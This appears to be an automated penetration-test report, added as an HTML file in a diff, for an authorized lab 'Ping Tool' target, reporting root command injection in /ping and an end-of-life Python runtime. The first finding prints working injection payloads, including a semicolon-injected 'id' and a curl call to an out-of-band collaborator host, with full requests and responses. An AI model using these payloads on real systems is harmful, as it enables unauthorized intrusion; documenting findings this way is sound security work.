@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqz08d2g-hyxaix</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] OS Command Injection (RCE as root) via ip_address in /ping</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] End-of-life runtime: Python 3.8.20 (3.8 series EOL 2024-10-07, no security updates)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqz08d2g-hyxaix</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32856/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T09:17:37.466Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>2</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32856</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>2 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] OS Command Injection (RCE as root) via ip_address in /ping</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32856/</div>
+<div class="desc">The unauthenticated /ping endpoint passes the `ip_address` POST parameter directly to an OS ping shell command without any sanitization. Shell metacharacters (semicolon) are interpreted by the OS. Injecting `127.0.0.1; id` causes the server to return `uid=0(root) gid=0(root) groups=0(root)` — the process runs as root, giving full system compromise. Additionally confirmed via OOB Burp Collaborator: `127.0.0.1; curl http://{oob-host}/` triggered 2x DNS and 1x HTTP callbacks from the target (IPs: 106.187.11.38, 27.80.249.86, 27.83.152.211).</div>
+<div><b>Reproduction</b></div><pre>1. POST /ping with body: ip_address=127.0.0.1%3B+id (no auth required)
+2. Response contains: uid=0(root) gid=0(root) groups=0(root)
+3. For OOB: ip_address=127.0.0.1%3B+curl+http%3A%2F%2F{collaborator}%2F triggers DNS+HTTP callbacks.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0bc5n-7</code> — <code>artifacts/s-0001/ev-mqz0bc5n-7/</code></div><div class="lbl">REQUEST</div><pre>POST /ping HTTP/1.1
+Host: target.local:32856
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+ip_address=127.0.0.1%3B+curl+http%3A%2F%2Fverdict-oob-noref-n0ozddr0.invalid%2F</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 622
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 09:19:55 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+[VERDICT-OOB] control: benign host, no callback expected</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0big0-9</code> — <code>artifacts/s-0001/ev-mqz0big0-9/</code></div><div class="lbl">REQUEST</div><pre>POST /ping HTTP/1.1
+Host: target.local:32856
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+ip_address=127.0.0.1%3B+curl+http%3A%2F%2Fn0ozddr07nygomrnzsr9nfdz4qai56u.oastify.com%2F</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 710
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 09:20:04 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=n0ozddr07nygomrnzsr9nfdz4qai56u.oastify.com payload_id=n0ozddr07nygomrnzsr9nfdz4qai56u interactions=[DNS@2026-06-29T09:19:57.420Z from 106.187.11.38; DNS@2026-06-29T09:19:57.423Z from 27.80.249.86; HTTP@2026-06-29T09:19:58.043Z from 27.83.152.211] [read#1]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0bjv1-a</code> — <code>artifacts/s-0001/ev-mqz0bjv1-a/</code></div><div class="lbl">REQUEST</div><pre>POST /ping HTTP/1.1
+Host: target.local:32856
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+ip_address=127.0.0.1%3B+curl+http%3A%2F%2Fn0ozddr07nygomrnzsr9nfdz4qai56u.oastify.com%2F</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 710
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 09:20:05 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=n0ozddr07nygomrnzsr9nfdz4qai56u.oastify.com payload_id=n0ozddr07nygomrnzsr9nfdz4qai56u interactions=[DNS@2026-06-29T09:19:57.420Z from 106.187.11.38; DNS@2026-06-29T09:19:57.423Z from 27.80.249.86; HTTP@2026-06-29T09:19:58.043Z from 27.83.152.211] [read#2]</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [vulnerable-component] End-of-life runtime: Python 3.8.20 (3.8 series EOL 2024-10-07, no security updates)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32856/</div>
+<div class="desc">The application discloses its runtime via the HTTP `Server` response header: `Werkzeug/3.0.6 Python/3.8.20` (observed by the fingerprint scan and reproduced on GET /). Python 3.8.20 is the FINAL release of the Python 3.8 series, which reached end-of-life on 2024-10-07. EOL means the runtime no longer receives security patches, so any CPython/stdlib vulnerability disclosed after that date (e.g. the asyncio/SSL DoS class, tarfile/zipfile and other parsing issues backported only to supported 3.9+ branches) remains permanently unpatched on this host. This is a VERSION-BASED finding: it is matched from the Server banner, not exploited — the operator should confirm the actual interpreter version on the host and plan an upgrade to a supported branch (3.12/3.13). Severity is medium: EOL runtime with no single confirmed RCE, but an accumulating set of unpatched stdlib CVEs over time. Note separately that the Werkzeug component (3.0.6) is current/patched and that the visible Server banner also reflects the Flask development WSGI server, which should not be used in production (track as a separate misconfiguration finding).</div>
+<div><b>Reproduction</b></div><pre>1. Send `GET /` to http://target.local:32856/ (or any path — the banner is on every response).
+2. Inspect the response `Server` header: `Werkzeug/3.0.6 Python/3.8.20`.
+3. Map `Python/3.8.20` to the Python release calendar: 3.8 series EOL = 2024-10-07; 3.8.20 is the last 3.8 release, so no further security fixes are issued for it.
+Evidence: positive replays ev-mqz0lkzj-p and ev-mqz0llqj-q are two stable GET / responses (200, 423 bytes) carrying the Werkzeug/Python banner; negative control ev-mqz0lmk5-r is a distinguishable 404 (207 bytes) for a non-existent path.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0lmk5-r</code> — <code>artifacts/_/ev-mqz0lmk5-r/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-verdict-control-xyz HTTP/1.1
+Host: target.local:32856
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 09:27:55 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0lkzj-p</code> — <code>artifacts/_/ev-mqz0lkzj-p/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32856
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 423
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 09:27:53 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Ping Tool&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Ping Tool&lt;/h1&gt;
+        &lt;form action=&quot;/ping&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;ip_address&quot; placeholder=&quot;Enter IP Address&quot; required&gt;
+            &lt;button type=&quot;submit&quot;&gt;Ping&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0llqj-q</code> — <code>artifacts/_/ev-mqz0llqj-q/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32856
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 423
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 09:27:54 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Ping Tool&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;Ping Tool&lt;/h1&gt;
+        &lt;form action=&quot;/ping&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;ip_address&quot; placeholder=&quot;Enter IP Address&quot; required&gt;
+            &lt;button type=&quot;submit&quot;&gt;Ping&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
